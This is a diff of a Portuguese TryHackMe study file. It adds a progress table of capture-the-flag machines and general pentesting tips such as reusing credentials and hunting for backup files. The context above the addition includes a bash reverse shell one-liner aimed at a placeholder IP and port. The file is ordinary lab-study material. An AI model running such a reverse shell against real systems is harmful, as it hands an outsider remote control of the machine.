@@ -203,3 +203,39 @@ python3 -m http.server 8000
 # Reverse shell
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
+
+
+# 🧠 TryHackMe - Controle de Estudos
+
+---
+
+## 📊 Progresso das Máquinas
+
+| Máquina         | Tipo       | Dificuldade | Status | 
+|-----------------|------------|-------------|--------|
+| Ignite          | Web        | Easy        | 🟩     |
+| Startup         | Linux      | Easy        | 🟩     |
+| RootMe          | Web        | Easy        | ⬜     |
+| Blog WordPress  | Web        | Easy        | ⬜     |
+| Blue            | Windows    | Easy        | 🟩     |
+| Blueprint       | Windows    | Easy        | ⬜     |
+
+---
+
+## ✅ Legenda
+
+- ⬜ Não iniciado
+- 🟨 Em andamento
+- 🟩 Concluído
+
+---
+
+## 🧠 Notas Gerais
+
+- Reutilizar credenciais entre serviços
+- Focar em enumeração antes de explorar
+- Testar sempre SMB, HTTP e FTP
+- Procurar arquivos de backup (.bak, .old, .save)
+- Observar banners e versões
+- Documentar tudo durante o processo
+
